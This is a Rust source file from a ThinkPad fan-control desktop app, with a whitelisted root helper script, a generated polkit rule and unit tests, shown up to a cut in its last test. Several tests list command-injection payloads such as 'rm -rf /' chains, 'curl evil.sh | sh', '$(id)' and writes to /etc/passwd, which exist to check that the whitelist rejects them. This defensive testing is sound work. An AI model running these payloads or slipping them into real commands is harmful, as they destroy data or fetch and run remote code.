use regex::Regex;
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::fs;
use std::process::Command;
use tauri::{Emitter, Manager};

const PROC_FAN: &str = "/proc/acpi/ibm/fan";

/// Where the privileged helper may live, in the order it is searched.
///
/// A distro package ships it at one of the first two paths, both of which are
/// root-owned and package-managed. `/usr/local` is reserved for the local
/// administrator — Debian Policy §9.1.2 and the Fedora guidelines both forbid a
/// package writing there — so it appears only as the legacy location used by the
/// app's own installer, kept so existing installs keep working.
pub const HELPER_CANDIDATES: &[&str] = &[
    // Debian and Arch convention for an internal helper not on $PATH.
    "/usr/lib/thinkpro-vantage/thinkpro-ctl",
    // Fedora convention (%{_libexecdir}).
    "/usr/libexec/thinkpro-vantage/thinkpro-ctl",
    // Legacy: written at runtime by setup_permissions() on a non-packaged install.
    "/usr/local/bin/thinkpro-ctl",
];

/// Where `setup_permissions()` writes the helper when the app installs its own.
///
/// Only used when no packaged helper is present — a package-owned file must
/// never be overwritten at runtime.
pub const HELPER_SELF_INSTALL_PATH: &str = "/usr/local/bin/thinkpro-ctl";

/// The first helper that actually exists, if any.
pub fn helper_path() -> Option<&'static str> {
    HELPER_CANDIDATES
        .iter()
        .copied()
        .find(|p| std::path::Path::new(p).exists())
}

/// Whether the helper came from a distro package.
///
/// When true the app must not install, overwrite, or offer to reinstall it: those
/// files belong to dpkg/rpm/pacman, and rewriting them puts the package database
/// out of sync with the filesystem.
pub fn helper_is_packaged() -> bool {
    HELPER_CANDIDATES
        .iter()
        .take(2)
        .any(|p| std::path::Path::new(p).exists())
}

/// Vendor-supplied polkit rules belong under /usr/share; /etc is the
/// administrator's namespace. A package writing to /etc/polkit-1/rules.d shadows
/// the admin's own rules and is never cleaned up on uninstall.
pub const POLKIT_RULE_PATH: &str = "/etc/polkit-1/rules.d/50-thinkpro-vantage.rules";
pub const POLKIT_RULE_PACKAGED_PATH: &str = "/usr/share/polkit-1/rules.d/50-thinkpro-vantage.rules";

/// Dedicated fan control helper script - validates input before writing to fan.
/// Installed at one of HELPER_CANDIDATES.
pub const HELPER_SCRIPT: &str = r#"#!/bin/bash
set -e
FAN="/proc/acpi/ibm/fan"

# One privileged entry point, three kinds of verb.
#
# Writes are an exact-match whitelist. "watchdog 30" is permitted because the
# firmware watchdog can only ever return the fan to automatic control -- it is
# the recovery path if this app dies while holding a manual level. No other
# watchdog value is accepted, and enable/disable are deliberately absent.
#
# Reads exist because several of the values the overview page shows are mode
# 0400 root-only in sysfs: the machine serial, the package energy counter, the
# DMI memory table and SMART counters. Rather than add a second privileged entry
# point (or ask for a password every poll), the same helper answers them with
# fixed commands and takes no argument from the caller.
#
# The GPU clock verb is the one write whose argument is a number rather than a
# fixed word, so its argument is validated instead of interpolated. The level it
# names is checked against this machine's own pp_dpm_sclk table before anything
# is written, the node itself is discovered here rather than accepted from the
# caller, and the level list that goes to the kernel is built from the same
# table. It cannot name a file the way a caller-supplied path could.
case "$1" in
    "level auto"|"level full-speed"|"level 0"|"level 1"|"level 2"|"level 3"|"level 4"|"level 5"|"level 6"|"level 7"|"watchdog 30")
        echo "$1" > "$FAN"
        ;;
    "gpu-clock-auto"|"gpu-clock-cap")
        # A GPU clock ceiling: the only verb here whose argument is a number
        # rather than a fixed word. Shape is checked before sysfs is touched at
        # all, so a bad argument reads as a bad argument on a machine with no
        # GPU exactly as it does on one that has a GPU.
        gpu_cap=""
        if [ "$1" = "gpu-clock-cap" ]; then
            gpu_cap="${2-}"
            if [ "$#" -ne 2 ] || [ -z "$gpu_cap" ] || [ -n "${gpu_cap//[0-9]/}" ]; then
                echo "gpu-clock-cap takes one decimal level index" >&2
                exit 1
            fi
        elif [ "$#" -ne 1 ]; then
            echo "gpu-clock-auto takes no argument" >&2
            exit 1
        fi

        # Discovered, never passed in: a path from the caller would make this a
        # general-purpose root write, which is what the whitelist prevents.
        gpu_sclk=""
        for candidate in /sys/class/drm/card*/device/pp_dpm_sclk; do
            [ -e "$candidate" ] || continue
            gpu_sclk="$candidate"
            break
        done
        if [ -z "$gpu_sclk" ]; then
            echo "no AMD GPU clock interface found" >&2
            exit 1
        fi

        # The indices this card lists, in table order. A line that is not
        # "<index>:" -- older designs print a deep-sleep "S:" entry -- is
        # skipped, so this is the same table the app parses.
        gpu_all=""
        while read -r gpu_line || [ -n "$gpu_line" ]; do
            gpu_index="${gpu_line%%:*}"
            gpu_index="${gpu_index//[^0-9]/}"
            if [ -n "$gpu_index" ]; then
                gpu_all="$gpu_all $gpu_index"
            fi
        done < "$gpu_sclk"
        if [ -z "$gpu_all" ]; then
            echo "the GPU lists no clock levels" >&2
            exit 1
        fi

        # A cap has to be a level this card has. Membership is a string compare
        # against the table just read, so a level the hardware does not publish
        # is refused here rather than passed to the kernel to reject.
        if [ -n "$gpu_cap" ]; then
            gpu_known=""
            for gpu_index in $gpu_all; do
                if [ "$gpu_index" = "$gpu_cap" ]; then
                    gpu_known=yes
                fi
            done
            if [ -z "$gpu_known" ]; then
                echo "this GPU has no clock level $gpu_cap" >&2
                exit 1
            fi
        fi

        # amdgpu reads a level-list write as the set of levels the GPU may use,
        # so a ceiling is every level up to the cap. Writing the cap index alone
        # would pin the card to that one clock and take the idle level with it.
        gpu_selected=""
        for gpu_index in $gpu_all; do
            if [ -z "$gpu_cap" ] || [ "$gpu_index" -le "$gpu_cap" ]; then
                gpu_selected="$gpu_selected $gpu_index"
            fi
        done
        gpu_selected="${gpu_selected# }"

        gpu_force="$(dirname "$gpu_sclk")/power_dpm_force_performance_level"

        # "manual" and the level list are one state, which is why they are one
        # verb rather than two: manual with no list in force, or a list with the
        # card still in an automatic mode, is a half-applied ceiling that lactd
        # reverts on its next tick.
        if [ -n "$gpu_cap" ] && [ -e "$gpu_force" ]; then
            if ! echo manual > "$gpu_force" 2>/dev/null; then
                echo "could not select manual GPU clock control" >&2
                exit 1
            fi
        fi

        if ! echo "$gpu_selected" > "$gpu_sclk" 2>/dev/null; then
            echo "could not write the GPU clock levels" >&2
            exit 1
        fi

        # Clearing the ceiling gives the card its own mode back, which is the
        # other half of "no cap". Best-effort: every level is already enabled
        # again, and failing here must not report that write as a failure.
        if [ -z "$gpu_cap" ] && [ -e "$gpu_force" ]; then
            echo auto > "$gpu_force" 2>/dev/null || true
        fi

        echo "GPU clock levels enabled: $gpu_selected"
        ;;
    "serial")
        # product_serial on a ThinkPad; board_serial on machines that only fill
        # the board entry. Exiting 6 rather than printing nothing keeps "the
        # firmware does not expose a serial" distinct from "here is an empty
        # serial", which the app has to tell apart to report it honestly.
        for candidate in /sys/class/dmi/id/product_serial /sys/class/dmi/id/board_serial; do
            if value=$(cat "$candidate" 2>/dev/null) && [ -n "$value" ]; then
                printf '%s\n' "$value"
                exit 0
            fi
        done
        exit 6
        ;;
    "rapl-package")
        # Package energy counter and its wrap point, as "<energy_uj> <max_uj>".
        # AMD and Intel both expose this through powercap; the package domain
        # sorts before its own subdomains, so the first match is the package.
        energy=""
        for f in /sys/class/powercap/*/energy_uj; do
            [ -r "$f" ] || continue
            energy="$f"
            break
        done
        [ -n "$energy" ] || exit 2
        printf '%s %s\n' \
            "$(cat "$energy" 2>/dev/null)" \
            "$(cat "$(dirname "$energy")/max_energy_range_uj" 2>/dev/null || echo 0)"
        ;;
    "dmi-memory")
        command -v dmidecode >/dev/null 2>&1 || exit 3
        dmidecode -t 17 2>/dev/null || exit 4
        ;;
    "smart-nvme")
        command -v smartctl >/dev/null 2>&1 || exit 3
        # The controller node (/dev/nvme0) is a character device; the block device
        # is the namespace, so the namespaces are what this looks for.
        device=""
        for candidate in /dev/nvme0n1 /dev/nvme1n1 /dev/nvme2n1 /dev/nvme0 /dev/nvme1; do
            if [ -b "$candidate" ]; then
                device="$candidate"
                break
            fi
        done
        [ -n "$device" ] || exit 4
        smartctl -j -H -A "$device" 2>/dev/null || exit 5
        ;;
    *)
        echo "Invalid command" >&2
        exit 1
        ;;
esac
"#;

/// Watchdog timeout, in seconds, that the helper is willing to arm.
///
/// Must stay in sync with the literal in HELPER_SCRIPT above; a test asserts it.
pub const FAN_WATCHDOG_SECS: u32 = 30;

/// Build the polkit rule granting passwordless exec to the helper, and nothing
/// else.
///
/// Generated from HELPER_CANDIDATES rather than written out, because the path
/// used to be duplicated in the rule text and in the constant — and a rule
/// naming a path the helper is not installed at grants nothing while looking
/// correct.
///
/// `subject.local && subject.active` is deliberate: without it, any SSH session
/// belonging to a wheel/sudo user gets passwordless root-adjacent exec, as does
/// a backgrounded session the user has switched away from. Fan control is a
/// physical-console concern.
pub fn polkit_rule() -> String {
    let allowed = HELPER_CANDIDATES
        .iter()
        .map(|p| format!("            program == \"{}\"", p))
        .collect::<Vec<_>>()
        .join(" ||\n");

    format!(
        r#"/* ThinkPro Vantage: passwordless fan control via the dedicated helper only.
 *
 * Generated from HELPER_CANDIDATES -- do not edit by hand. The helper's own
 * whitelist is the grant: fan levels and the watchdog arm, fixed reads that
 * take no argument, and a GPU clock verb whose level is checked against the
 * card's own pp_dpm_sclk table. Nothing it accepts runs caller-supplied code,
 * so this grants exactly that and no general privilege.
 */
polkit.addRule(function(action, subject) {{
    if (action.id == "org.freedesktop.policykit.exec") {{
        var program = action.lookup("program");
        if (
{}
        ) {{
            /* Local, active sessions only: an SSH session must not inherit
               passwordless hardware control. */
            if (subject.local && subject.active &&
                (subject.isInGroup("wheel") || subject.isInGroup("sudo"))) {{
                return polkit.Result.YES;
            }}
        }}
    }}
}});
"#,
        allowed
    )
}

/// Valid fan speed values (whitelist)
const VALID_SPEEDS: &[&str] = &["auto", "full-speed", "0", "1", "2", "3", "4", "5", "6", "7"];

/// Whether a fan speed is one this app is willing to send to the hardware.
///
/// This is the Rust-side gate; the installed helper script re-checks the full
/// `level <speed>` string independently, so a bypass here still hits a second
/// whitelist before anything is written.
fn is_valid_speed(speed: &str) -> bool {
    VALID_SPEEDS.contains(&speed)
}

/// Parse the contents of /proc/acpi/ibm/fan.
///
/// Format is `key:\tvalue` lines, e.g.
/// ```text
/// status:         enabled
/// speed:          3084
/// level:          auto
/// ```
/// Unknown keys are ignored — the file carries commands and capability hints
/// (`commands:`, `watchdog:`) that are not fan readings.
fn parse_fan_proc(content: &str) -> HashMap<String, String> {
    let mut fans = HashMap::new();

    for line in content.lines() {
        if let Some((key, value)) = line.split_once(':') {
            let key = key.trim();
            let value = value.trim();

            match key {
                "status" => {
                    fans.insert("status".to_string(), value.to_string());
                }
                "level" => {
                    fans.insert("level".to_string(), value.to_string());
                }
                "speed" => {
                    fans.insert("Fan1".to_string(), format!("{} RPM", value));
                }
                _ => {}
            }
        }
    }

    fans
}

/// Path to the modprobe config that enables fan control at boot.
pub const MODPROBE_CONF_PATH: &str = "/etc/modprobe.d/thinkpad_acpi.conf";

/// Whether the kernel module will accept fan writes at all.
///
/// thinkpad_acpi's `fan_set_level()` returns -EPERM unless the module was loaded
/// with `fan_control=1`, and that parameter is mode 0444 — it cannot be toggled
/// at runtime, so no amount of privilege escalation fixes it.
///
/// The driver zeroes `fan_control_commands` when the parameter is off, and
/// `fan_read()` only emits the `commands:` lines when it is set. So the presence
/// of those lines is a reliable, read-only probe for "writes will succeed".
///
/// Without this check the app reports EPERM as "Permission denied. Click Grant
/// Permissions" — advice that can never work, because the problem is the module,
/// not polkit.
fn fan_control_is_enabled(proc_fan_content: &str) -> bool {
    proc_fan_content
        .lines()
        .any(|l| l.trim_start().starts_with("commands:"))
}

/// What is standing between the user and working fan control.
///
/// Serialised in snake_case like every other enum crossing to the frontend, so
/// the view can compare against a stable string instead of a Rust variant name.
#[derive(Debug, Clone, Copy, Serialize, Deserialize, PartialEq)]
#[serde(rename_all = "snake_case")]
pub enum FanReadiness {
    /// Writes should work.
    Ready,
    /// The module needs `fan_control=1`; polkit cannot help.
    NeedsModuleParam,
    /// No thinkpad_acpi fan interface — not a supported ThinkPad, or the module
    /// is not loaded.
    NoThinkpadFan,
}

#[derive(Debug, Serialize, Deserialize)]
pub struct FanCapability {
    pub readiness: FanReadiness,
    /// True once the modprobe config exists, meaning the fix is applied but a
    /// reboot or module reload is still needed for it to take effect.
    pub modprobe_conf_present: bool,
    pub message: String,
}

#[tauri::command]
pub fn get_fan_capability() -> ApiResponse<FanCapability> {
    let modprobe_conf_present = crate::hardware_root::read_to_string(MODPROBE_CONF_PATH)
        .map(|c| c.contains("fan_control=1"))
        .unwrap_or(false);

    let (readiness, message) = match crate::hardware_root::read_to_string(PROC_FAN) {
        Err(_) => (
            FanReadiness::NoThinkpadFan,
            "No ThinkPad fan interface found. Load the thinkpad_acpi module, or this model may not be supported.".to_string(),
        ),
        Ok(content) if fan_control_is_enabled(&content) => {
            (FanReadiness::Ready, "Fan control is available.".to_string())
        }
        Ok(_) if modprobe_conf_present => (
            FanReadiness::NeedsModuleParam,
            "Fan control is configured but not active yet. Reboot, or reload the thinkpad_acpi module.".to_string(),
        ),
        Ok(_) => (
            FanReadiness::NeedsModuleParam,
            "The thinkpad_acpi module was loaded without fan_control=1, so it will refuse fan changes. This is a kernel module setting, not a permissions problem.".to_string(),
        ),
    };

    ApiResponse {
        success: true,
        data: Some(FanCapability {
            readiness,
            modprobe_conf_present,
            message,
        }),
        error: None,
    }
}

/// Write the modprobe config and try to reload the module.
#[tauri::command]
pub async fn enable_fan_control() -> ApiResponse<String> {
    // The reload can fail if the module is busy (an open /proc handle, a laptop
    // dock driver holding it). That is not an error worth failing on -- the
    // config file is written either way, so a reboot will apply it.
    let script = format!(
        "#!/bin/bash\nset -e\nprintf 'options thinkpad_acpi fan_control=1\\n' > {}\nmodprobe -r thinkpad_acpi 2>/dev/null && modprobe thinkpad_acpi 2>/dev/null || true\nexit 0\n",
        MODPROBE_CONF_PATH
    );

    match crate::privileged::run_script(&script).await {
        Ok(output) if output.status.success() => {
            // Re-probe rather than assume the reload worked.
            let now_ready = crate::hardware_root::read_to_string(PROC_FAN)
                .map(|c| fan_control_is_enabled(&c))
                .unwrap_or(false);

            ApiResponse {
                success: true,
                data: Some(if now_ready {
                    "Fan control enabled.".to_string()
                } else {
                    "Fan control configured. Reboot to activate it — the module could not be reloaded while in use.".to_string()
                }),
                error: None,
            }
        }
        Ok(output) => ApiResponse {
            success: false,
            data: None,
            error: Some(format!(
                "Could not enable fan control: {}",
                String::from_utf8_lossy(&output.stderr)
            )),
        },
        Err(e) => ApiResponse {
            success: false,
            data: None,
            error: Some(format!("Could not enable fan control: {}", e)),
        },
    }
}

#[derive(Debug, Serialize, Deserialize)]
pub struct SensorData {
    pub temps: HashMap<String, String>,
    pub fans: HashMap<String, String>,
}

#[derive(Debug, Serialize, Deserialize)]
pub struct ApiResponse<T> {
    pub success: bool,
    pub data: Option<T>,
    pub error: Option<String>,
}

#[tauri::command]
pub fn get_sensor_data() -> ApiResponse<SensorData> {
    let mut temps = HashMap::new();
    let mut fans = HashMap::new();

    // Get fan info from /proc/acpi/ibm/fan
    match crate::hardware_root::read_to_string(PROC_FAN) {
        Ok(content) => {
            fans.extend(parse_fan_proc(&content));
        }
        Err(e) => {
            return ApiResponse {
                success: false,
                data: None,
                error: Some(format!("Failed to read {}: {}", PROC_FAN, e)),
            };
        }
    }

    // Get temperature data from sensors command
    match Command::new("sensors").arg("thinkpad-isa-0000").output() {
        Ok(output) => {
            if output.status.success() {
                let stdout = String::from_utf8_lossy(&output.stdout);
                // Both patterns are compiled once. rpm_re used to be rebuilt on
                // every line of `sensors` output, which is the hot path here.
                let temp_re = Regex::new(r"^(.+?):\s+\+?([0-9.]+°C)").unwrap();
                let rpm_re = Regex::new(r"(\d+\s*RPM)").unwrap();

                for line in stdout.lines() {
                    if let Some(caps) = temp_re.captures(line) {
                        let label = caps.get(1).unwrap().as_str().trim();
                        let value = caps.get(2).unwrap().as_str();
                        let label_lower = label.to_lowercase();
                        if label_lower.contains("cpu") || label_lower.contains("gpu") {
                            temps.insert(label.to_string(), value.to_string());
                        }
                    }

                    if line.starts_with("fan") && line.contains("RPM") {
                        if let Some((label, rest)) = line.split_once(':') {
                            let label = label.trim();
                            if let Some(rpm_match) = rpm_re.find(rest) {
                                fans.insert(label.to_string(), rpm_match.as_str().to_string());
                            }
                        }
                    }
                }
            } else {
                temps.insert(
                    "Info".to_string(),
                    "Install lm-sensors for temperature data".to_string(),
                );
            }
        }
        Err(_) => {
            temps.insert(
                "Info".to_string(),
                "Install lm-sensors: sudo apt install lm-sensors".to_string(),
            );
        }
    }

    ApiResponse {
        success: true,
        data: Some(SensorData { temps, fans }),
        error: None,
    }
}

/// Write a single command to /proc/acpi/ibm/fan, elevating via the helper when
/// a direct write is not permitted.
pub async fn write_fan_command(command: &str) -> Result<(), String> {
    if crate::hardware_root::is_simulated() {
        return Ok(());
    }

    // 1. Try direct write (no elevation needed)
    if fs::write(PROC_FAN, command).is_ok() {
        return Ok(());
    }

    // 2. Use dedicated helper if installed (passwordless via polkit rule)
    if let Some(helper) = helper_path() {
        match tokio::process::Command::new("pkexec")
            .arg(helper)
            .arg(command)
            .output()
            .await
        {
            Ok(output) if output.status.success() => {
                return Ok(());
            }
            Ok(_) => {
                return Err("Permission denied. Click 'Grant Permissions' to enable passwordless fan control.".to_string());
            }
            Err(e) => {
                return Err(format!("Failed to execute helper: {}", e));
            }
        }
    }

    // 3. Fallback: secure temp script + pkexec (will prompt for password)
    let script_content = format!(
        "#!/bin/bash\nset -e\necho '{}' > {}\nexit 0\n",
        command, PROC_FAN
    );

    match crate::privileged::run_script(&script_content).await {
        Ok(output) if output.status.success() => Ok(()),
        Ok(_) => Err(
            "Permission denied. Click 'Grant Permissions' to avoid repeated password prompts."
                .to_string(),
        ),
        Err(e) => Err(format!("Failed to execute pkexec: {}", e)),
    }
}

/// Read the current fan level from /proc/acpi/ibm/fan, if available.
pub fn read_fan_level() -> Option<String> {
    let content = crate::hardware_root::read_to_string(PROC_FAN).ok()?;
    parse_fan_proc(&content).remove("level")
}

pub async fn apply_fan_speed(app: &tauri::AppHandle, raw_speed: &str) -> Result<String, String> {
    let speed = match raw_speed {
        "full" | "max" => "full-speed",
        s => s,
    };

    // Validate speed against whitelist
    if !is_valid_speed(speed) {
        return Err(format!("Invalid fan speed: {}", speed));
    }

    // Reads may come from a captured hardware profile; writes never may. A test
    // must not be able to believe it changed a real fan.
    if crate::hardware_root::is_simulated() {
        return Err(
            "Running against a simulated hardware profile. Fan changes are disabled.".to_string(),
        );
    }

    println!("[Fan] Setting speed to: {}", speed);
    let command_str = format!("level {}", speed);

    // Check the module parameter before trying anything. If fan_control=1 is
    // missing the kernel returns -EPERM no matter who we are, and telling the
    // user to grant permissions sends them somewhere that cannot help.
    if let Ok(content) = crate::hardware_root::read_to_string(PROC_FAN) {
        if !fan_control_is_enabled(&content) {
            return Err(
                "The thinkpad_acpi module was loaded without fan_control=1, so the kernel will refuse fan changes. Enable it from the Fan Control page — this is a module setting, not a permissions problem.".to_string(),
            );
        }
    }

    // Update target mode in supervisor so background task maintains it and keeps watchdog alive
    let target_mode = match speed {
        "auto" => crate::fan_curve::FanTargetMode::Auto,
        "full-speed" => crate::fan_curve::FanTargetMode::FullSpeed,
        s => crate::fan_curve::FanTargetMode::Manual(s.to_string()),
    };

    if let Some(state) = app.try_state::<crate::fan_curve::FanCurveState>() {
        if let Ok(mut s) = state.lock() {
            s.mode = target_mode;
            s.curve_config.enabled = false;
        }
    }

    match write_fan_command(&command_str).await {
        Ok(_) => {
            println!("[Fan] ✓ Speed set successfully to: {}", speed);
            if speed != "auto" {
                crate::fan_curve::arm_fan_watchdog().await;
            }
            let _ = app.emit_to(
                "main",
                "fan-speed-changed",
                serde_json::json!({ "speed": speed }),
            );
            let _ = app.emit("fan-speed-changed", serde_json::json!({ "speed": speed }));
            Ok(format!("Fan speed set to: {}", speed))
        }
        Err(e) => {
            println!("[Fan] Failed to set fan speed: {}", e);
            Err(e)
        }
    }
}

#[tauri::command]
pub async fn set_fan_speed(app: tauri::AppHandle, speed: String) -> ApiResponse<String> {
    match apply_fan_speed(&app, &speed).await {
        Ok(msg) => ApiResponse {
            success: true,
            data: Some(msg),
            error: None,
        },
        Err(e) => ApiResponse {
            success: false,
            data: None,
            error: Some(e),
        },
    }
}

#[tauri::command]
pub fn check_permissions() -> ApiResponse<bool> {
    // Check if direct write is possible
    let direct_write = fs::OpenOptions::new().write(true).open(PROC_FAN).is_ok();

    // Check if the dedicated helper is installed (installed alongside the polkit rule).
    // We only check the helper because /etc/polkit-1/rules.d/ is root-only,
    // so Path::exists() on the polkit rule always fails for normal users.
    let helper_installed = helper_path().is_some();

    let has_permission = direct_write || helper_installed;

    ApiResponse {
        success: true,
        data: Some(has_permission),
        error: None,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    // -- Speed whitelist --

    #[test]
    fn accepts_every_documented_speed() {
        for s in ["auto", "full-speed", "0", "1", "2", "3", "4", "5", "6", "7"] {
            assert!(is_valid_speed(s), "'{}' should be accepted", s);
        }
    }

    #[test]
    fn rejects_out_of_range_and_malformed_speeds() {
        for s in [
            "8",
            "-1",
            "99",
            "AUTO",
            "Auto",
            "full speed",
            "fullspeed",
            "",
            " 3",
            "3 ",
            "0x3",
            "level 3",
        ] {
            assert!(!is_valid_speed(s), "'{}' should be rejected", s);
        }
    }

    /// The speed reaches a shell as `level <speed>`, so metacharacters must not survive.
    #[test]
    fn rejects_shell_metacharacters_in_speed() {
        for s in [
            "auto; rm -rf /",
            "3 && curl evil.sh | sh",
            "$(id)",
            "`id`",
            "3\nrm -rf /",
            "3 > /etc/passwd",
        ] {
            assert!(!is_valid_speed(s), "{:?} should be rejected", s);
        }
    }

    // -- /proc/acpi/ibm/fan parsing --

    /// Real output from a ThinkPad running thinkpad_acpi.
    const SAMPLE_PROC_FAN: &str = "\
status:\t\tenabled
speed:\t\t3084
level:\t\tauto
commands:\tlevel <level> (<level> is 0-7, auto, disengaged, full-speed)
commands:\tenable, disable
commands:\twatchdog <timeout> (0 disables, timeout is 0-120)
";

    #[test]
    fn parses_status_speed_and_level() {
        let fans = parse_fan_proc(SAMPLE_PROC_FAN);
        assert_eq!(fans.get("status").map(String::as_str), Some("enabled"));
        assert_eq!(fans.get("level").map(String::as_str), Some("auto"));
        assert_eq!(fans.get("Fan1").map(String::as_str), Some("3084 RPM"));
    }

    /// `commands:` lines describe capabilities, not readings. Treating them as fan
    /// data would surface "level <level> (<level> is 0-7...)" in the UI as a level.
    #[test]
    fn ignores_command_and_capability_lines() {
        let fans = parse_fan_proc(SAMPLE_PROC_FAN);
        assert_eq!(fans.len(), 3, "unexpected keys: {:?}", fans);
        assert!(!fans.contains_key("commands"));
        assert!(!fans.contains_key("watchdog"));
    }

    #[test]
    fn tolerates_empty_and_malformed_input() {
        assert!(parse_fan_proc("").is_empty());
        assert!(parse_fan_proc("no colon here\nanother line").is_empty());
        // A key with no value should not panic and should yield an empty string.
        assert_eq!(
            parse_fan_proc("level:").get("level").map(String::as_str),
            Some("")
        );
    }

    #[test]
    fn parses_numeric_level_not_just_auto() {
        let fans = parse_fan_proc("status:\tenabled\nlevel:\t7\nspeed:\t4500\n");
        assert_eq!(fans.get("level").map(String::as_str), Some("7"));
        assert_eq!(fans.get("Fan1").map(String::as_str), Some("4500 RPM"));
    }

    // -- fan_control=1 module parameter detection --

    /// The whole point of this probe: without fan_control=1 the driver zeroes
    /// fan_control_commands and fan_read() omits the commands: lines. Their
    /// absence means every write will return -EPERM, and no amount of polkit
    /// will change that.
    #[test]
    fn detects_fan_control_disabled_by_absent_commands_lines() {
        let without = "status:\t\tenabled\nspeed:\t\t2413\nlevel:\t\tauto\n";
        assert!(!fan_control_is_enabled(without));
    }

    #[test]
    fn detects_fan_control_enabled_by_commands_lines() {
        assert!(fan_control_is_enabled(SAMPLE_PROC_FAN));
    }

    #[test]
    fn fan_control_detection_tolerates_empty_and_partial_input() {
        assert!(!fan_control_is_enabled(""));
        assert!(!fan_control_is_enabled("status:\tenabled"));
        // A value that merely mentions the word must not count as a commands line.
        assert!(!fan_control_is_enabled("level:\tcommands: not really"));
    }

    // -- The installed privileged helper --

    /// Write HELPER_SCRIPT to a temp file and run it, so we test the bash that
    /// actually gets installed at HELPER_PATH and invoked under pkexec.
    ///
    /// The GPU verb takes two words, so the arguments arrive as argv rather than
    /// as one string: a payload that only looks like two words has to be tested
    /// that way, because that is not how it would reach the helper.
    fn run_helper(args: &[&str]) -> std::process::Output {
        use std::io::Write;
        use std::os::unix::fs::OpenOptionsExt;

        let nanos = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap_or_default()
            .as_nanos();
        let path = std::env::temp_dir().join(format!(
            "thinkpro-vantage_helper_test_{}_{}.sh",
            std::process::id(),
            nanos
        ));

        let mut f = fs::OpenOptions::new()
            .create_new(true)
            .write(true)
            .mode(0o700)
            .open(&path)
            .expect("create helper");
        f.write_all(HELPER_SCRIPT.as_bytes()).expect("write helper");
        drop(f);

        let out = Command::new("bash")
            .arg(&path)
            .args(args)
            .output()
            .expect("run helper");
        let _ = fs::remove_file(&path);
        out
    }

    /// This is the security boundary: the helper runs as root under a polkit rule
    /// that grants it passwordless. If its case statement ever accepts something
    /// outside the whitelist, that is arbitrary root.
    #[test]
    fn helper_rejects_everything_outside_the_whitelist() {
        let payloads = [
            "level 8",
            "level -1",
            "enable",
            "disable",
            "level auto; rm -rf /",
            "level auto && curl evil.sh | sh",
            "level $(id)",
            "level `id`",
            "level auto\nrm -rf /",
            "; rm -rf /",
            "../../etc/passwd",
            "level AUTO",
            "",
        ];
        for p in payloads {
            let out = run_helper(&[p]);
            let stderr = String::from_utf8_lossy(&out.stderr);
            assert!(
                stderr.contains("Invalid command"),
                "helper did not reject {:?} (stderr: {:?})",
                p,
                stderr
            );
            assert!(!out.status.success(), "helper exited 0 for {:?}", p);
        }
    }

    /// The watchdog is the recovery path when this app dies holding a manual
    /// level, so exactly one value is permitted -- and only that value.
    #[test]
    fn helper_accepts_only_the_one_watchdog_value() {
        let out = run_helper(&[&format!("watchdog {}", FAN_WATCHDOG_SECS)]);
        assert!(
            !String::from_utf8_lossy(&out.stderr).contains("Invalid command"),
            "helper must accept the watchdog arm command"
        );
        for bad in ["watchdog 0", "watchdog 1", "watchdog 120", "watchdog"] {
            let out = run_helper(&[bad]);
            assert!(
                String::from_utf8_lossy(&out.stderr).contains("Invalid command"),
                "helper must reject {:?}",
                bad
            );
        }
    }

    /// HELPER_SCRIPT hardcodes the timeout in a bash case arm, so a change to
    /// the constant alone would silently stop the watchdog from ever arming.
    #[test]
    fn watchdog_constant_matches_helper_script() {
        assert!(
            HELPER_SCRIPT.contains(&format!("watchdog {}", FAN_WATCHDOG_SECS)),
            "FAN_WATCHDOG_SECS ({}) has no matching arm in HELPER_SCRIPT",
            FAN_WATCHDOG_SECS
        );
    }

    /// Complements the above: the whitelist must not be so tight that legitimate
    /// commands are refused. We assert only that they are not *rejected* — the
    /// write itself needs a ThinkPad and root, so it is expected to fail in CI.
    #[test]
    fn helper_accepts_the_documented_commands() {
        for level in ["auto", "full-speed", "0", "1", "2", "3", "4", "5", "6", "7"] {
            let arg = format!("level {}", level);
            let out = run_helper(&[&arg]);
            let stderr = String::from_utf8_lossy(&out.stderr);
            assert!(
                !stderr.contains("Invalid command"),
                "helper wrongly rejected {:?} (stderr: {:?})",
                arg,
                stderr
            );
        }
    }

    /// The GPU verb is the only one that takes an argument from the app, so it is
    /// the only one that could be used to name something. Every part of that
    /// argument is checked before sysfs is touched, which is what makes these
    /// rejections the helper's own rather than the kernel's -- and what makes
    /// them hold on a machine with no AMD GPU at all.
    #[test]
    fn helper_gpu_verb_refuses_anything_that_is_not_one_level_index() {
        let shaped_wrong: [&[&str]; 7] = [
            &["gpu-clock-cap"],
            &["gpu-clock-cap", ""],
            &["gpu-clock-cap", "abc"],
            &["gpu-clock-cap", "1x"],
            &["gpu-clock-cap", "-1"],
            &["gpu-clock-cap", "1 2"],
            &["gpu-clock-cap", "1", "2"],
        ];
        for args in shaped_wrong {
            let out = run_helper(args);
            let stderr = String::from_utf8_lossy(&out.stderr);
            assert!(!out.status.success(), "{:?} was accepted", args);
            assert!(
                stderr.contains("takes one decimal level index"),
                "{:?} was refused for the wrong reason: {:?}",
                args,
                stderr
            );
            assert!(
                !stderr.contains("no AMD GPU clock interface"),
                "{:?} reached the hardware before its argument was checked",
                args
            );
        }

        // Two words in one argv is not the verb, and an argument to the form
        // that takes none is not an argument.
        let run_together = run_helper(&["gpu-clock-cap 1"]);
        assert!(
            String::from_utf8_lossy(&run_together.stderr).contains("Invalid command"),
            "a verb and its level in one argv must not be accepted"
        );
        let extra = run_helper(&["gpu-clock-auto", "0"]);
        assert!(!extra.status.success());
        assert!(String::from_utf8_lossy(&extra.stderr).contains("takes no argument"));
    }

    /// On a machine that has an amdgpu clock node, a level the card lists has to
    /// get past the argument and the membership check to the write itself. Run
    /// here as the invoking user the write is refused, because the node is
    /// root-owned: what is asserted is which refusal it is, which is what pins
    /// the failure to the hardware rather than to the validation in front of it.
    #[test]
    fn helper_gpu_verb_reaches_the_write_on_a_machine_that_has_a_card() {
        let sclk = fs::read_dir("/sys/class/drm").ok().and_then(|entries| {
            entries
                .filter_map(|entry| entry.ok())
                .map(|entry| entry.path().join("device/pp_dpm_sclk"))
                .find(|path| path.exists())
        });
        let Some(sclk) = sclk else {
            eprintln!("no amdgpu clock node on this machine, so the verb has nothing to reach");
            return;
        };

        let out = run_helper(&["gpu-clock-cap", "0"]);
        let stderr = String::from_utf8_lossy(&out.stderr);
        assert!(
            !stderr.contains("syntax error") && !stderr.contains("Invalid command"),
            "the GPU arm did not run: {:?}",
            stderr
        );
        assert!(
            !stderr.contains("takes one decimal level index")
                && !stderr.contains("has no clock level"),
